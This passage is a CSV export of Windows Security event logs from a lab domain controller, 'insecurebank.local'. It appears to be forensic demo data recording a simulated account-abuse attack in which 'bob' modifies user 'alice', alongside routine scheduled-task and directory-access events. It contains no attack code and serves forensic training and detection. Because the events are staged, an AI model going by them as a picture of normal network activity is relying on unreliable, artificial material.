35,198238548,2019-03-25 11:19:35.8206043,4738,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3948,DC1.insecurebank.local,0,,A user account was changed,insecurebank\bob,,Target: insecurebank\alice,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: - AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: -,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""Dummy"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""alice""},{""@Name"":""TargetDomainName"",""#text"":""insecurebank""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1107""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3CADE20""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""-""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""}]}}"
36,198238563,2019-03-25 11:22:45.0806096,4702,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2260,DC1.insecurebank.local,0,,A scheduled task was updated,insecurebank\DC1$,,TaskName: \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask,"TaskContentNew: &lt;?xml version=""1.0"" encoding=""UTF-16""?&gt;, &lt;Task version=""1.4"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\system32\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T11:21:44Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=""NetworkService""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=""NetworkService""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-20""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E4""},{""@Name"":""TaskName"",""#text"":""\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask""},{""@Name"":""TaskContentNew"",""#text"":""&lt;?xml version=\""1.0\"" encoding=\""UTF-16\""?&gt;, &lt;Task version=\""1.4\"" xmlns=\""http://schemas.microsoft.com/windows/2004/02/mit/task\""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\\system32\\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T11:21:44Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=\""NetworkService\""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=\""NetworkService\""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;""}]}}"
37,198238774,2019-03-25 11:52:45.1436178,4702,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,4024,DC1.insecurebank.local,0,,A scheduled task was updated,insecurebank\DC1$,,TaskName: \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask,"TaskContentNew: &lt;?xml version=""1.0"" encoding=""UTF-16""?&gt;, &lt;Task version=""1.4"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\system32\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T11:51:45Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=""NetworkService""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=""NetworkService""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-20""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E4""},{""@Name"":""TaskName"",""#text"":""\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask""},{""@Name"":""TaskContentNew"",""#text"":""&lt;?xml version=\""1.0\"" encoding=\""UTF-16\""?&gt;, &lt;Task version=\""1.4\"" xmlns=\""http://schemas.microsoft.com/windows/2004/02/mit/task\""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\\system32\\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T11:51:45Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=\""NetworkService\""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=\""NetworkService\""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;""}]}}"
38,198238842,2019-03-25 12:05:30.6836102,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\DC1$,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%7688, )",AccessMask: Unknown code (0x100),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0xB3AC2""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7688, ""},{""@Name"":""AccessMask"",""#text"":""0x100""},{""@Name"":""Properties"",""#text"":""%%7688, {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
39,198238969,2019-03-25 12:22:45.3176056,4702,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A scheduled task was updated,insecurebank\DC1$,,TaskName: \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask,"TaskContentNew: &lt;?xml version=""1.0"" encoding=""UTF-16""?&gt;, &lt;Task version=""1.4"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\system32\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\system32\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T12:21:45Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=""NetworkService""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=""NetworkService""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-20""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E4""},{""@Name"":""TaskName"",""#text"":""\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask""},{""@Name"":""TaskContentNew"",""#text"":""&lt;?xml version=\""1.0\"" encoding=\""UTF-16\""?&gt;, &lt;Task version=\""1.4\"" xmlns=\""http://schemas.microsoft.com/windows/2004/02/mit/task\""&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%\\system32\\sppc.dll,-200)&lt;/Author&gt;,     &lt;Version&gt;1.0&lt;/Version&gt;,     &lt;Description&gt;$(@%systemroot%\\system32\\sppc.dll,-201)&lt;/Description&gt;,     &lt;URI&gt;\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-123231216-2592883651-3715271367-3753151631-4175906628)(A;;FR;;;S-1-5-87-2912274048-3994893941-1669128114-1310430903-1263774323)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;CalendarTrigger&gt;,       &lt;StartBoundary&gt;2019-03-26T12:21:45Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;ScheduleByDay&gt;,         &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;,       &lt;/ScheduleByDay&gt;,     &lt;/CalendarTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id=\""NetworkService\""&gt;,       &lt;UserId&gt;S-1-5-20&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;true&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,     &lt;RestartOnFailure&gt;,       &lt;Interval&gt;PT1M&lt;/Interval&gt;,       &lt;Count&gt;3&lt;/Count&gt;,     &lt;/RestartOnFailure&gt;,   &lt;/Settings&gt;,   &lt;Actions Context=\""NetworkService\""&gt;,     &lt;ComHandler&gt;,       &lt;ClassId&gt;{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}&lt;/ClassId&gt;,       &lt;Data&gt;&lt;![CDATA[timer]]&gt;&lt;/Data&gt;,     &lt;/ComHandler&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;""}]}}"
40,198239007,2019-03-25 12:31:35.1436348,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6d8a089c-f91e-41b4-a1d6-5985255210c3},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6d8a089c-f91e-41b4-a1d6-5985255210c3}""},{""@Name"":""OperationType"",""#text"":""Object 